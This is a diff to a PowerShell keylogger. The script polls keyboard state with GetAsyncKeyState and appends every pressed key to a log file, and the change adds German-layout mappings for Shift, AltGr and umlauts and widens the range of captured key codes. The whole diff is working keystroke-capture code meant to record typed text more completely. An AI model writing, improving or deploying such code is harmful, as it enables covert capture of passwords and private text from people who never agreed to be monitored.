@@ -25,27 +25,55 @@ function Get-KeyChar {
     param($char)
     $shift = ([Keyboard]::GetAsyncKeyState(16) -ne 0) # Shift-Key
     $caps = ([Keyboard]::GetAsyncKeyState(20) -ne 0) # CapsLock
-    if ($char -ge 65 -and $char -le 90) { # A-Z
+    $altgr = ([Keyboard]::GetAsyncKeyState(165) -ne 0) # AltGr (rechte Alt-Taste)
+    # Mapping für deutsches Layout
+    $deMap = @{
+        32 = ' '; 13 = "\n"; # Space, Enter
+        48 = '0'; 49 = '1'; 50 = '2'; 51 = '3'; 52 = '4'; 53 = '5'; 54 = '6'; 55 = '7'; 56 = '8'; 57 = '9';
+        186 = 'ö'; 222 = 'ä'; 192 = 'ü'; 219 = '+'; 221 = '#'; 220 = 'ß';
+        188 = ','; 190 = '.'; 191 = '-'; 189 = '-'; 187 = '='; 9 = "\t";
+    }
+    $deShiftMap = @{
+        48 = '='; 49 = '!'; 50 = '"'; 51 = '§'; 52 = '$'; 53 = '%'; 54 = '&'; 55 = '/'; 56 = '('; 57 = ')';
+        186 = 'Ö'; 222 = 'Ä'; 192 = 'Ü'; 219 = '*'; 221 = ''''; 220 = '?';
+        188 = ';'; 190 = ':'; 191 = '_'; 189 = '_'; 187 = '*';
+    }
+    $deAltGrMap = @{
+        81 = '@'; 69 = '€'; 55 = '{'; 56 = '['; 57 = ']'; 48 = '}'; 222 = '"'; 191 = '\\'; 220 = '~';
+    }
+    # Buchstaben
+    if ($char -ge 65 -and $char -le 90) {
         if ($shift -xor $caps) {
             return [char]$char
         } else {
-            return ([char]($char + 32)) # a-z
+            return ([char]($char + 32))
         }
-    } elseif ($char -ge 48 -and $char -le 57) { # 0-9
-        if ($shift) {
-            $shiftNums = @(')','!','"','#','$','%','&','/','(','=')
-            return $shiftNums[$char-48]
+    }
+    # Zahlen und Sonderzeichen
+    if ($char -ge 48 -and $char -le 57) {
+        if ($altgr -and $deAltGrMap.ContainsKey($char)) {
+            return $deAltGrMap[$char]
+        } elseif ($shift -and $deShiftMap.ContainsKey($char)) {
+            return $deShiftMap[$char]
+        } elseif ($deMap.ContainsKey($char)) {
+            return $deMap[$char]
         } else {
             return [char]$char
         }
+    }
+    # Umlaute und weitere Sonderzeichen
+    if ($altgr -and $deAltGrMap.ContainsKey($char)) {
+        return $deAltGrMap[$char]
+    } elseif ($shift -and $deShiftMap.ContainsKey($char)) {
+        return $deShiftMap[$char]
+    } elseif ($deMap.ContainsKey($char)) {
+        return $deMap[$char]
+    } elseif ($char -eq 32) {
+        return ' '
+    } elseif ($char -eq 13) {
+        return "\n"
     } else {
-        # Standardzeichen, rudimentär für DE-Layout
-        $deSpec = @{44=';';46=',';45='-';47='#';59='ö';91='ü';93='ä';92='ß'}
-        if ($deSpec.ContainsKey($char)) {
-            return $deSpec[$char]
-        } else {
-            return [char]$char
-        }
+        return [char]$char
     }
 }
 
@@ -54,7 +82,7 @@ while ($true) {
     if ($elapsed.TotalSeconds -ge $timeout) {
         break
     }
-    foreach ($char in 32..126) {
+    foreach ($char in 8,9,13,32..126,186,187,188,189,190,191,192,219,220,221,222) {
         if ([Keyboard]::GetAsyncKeyState($char) -eq -32767) {
             $key = Get-KeyChar $char
             Add-Content -Path $logFile -Value $key
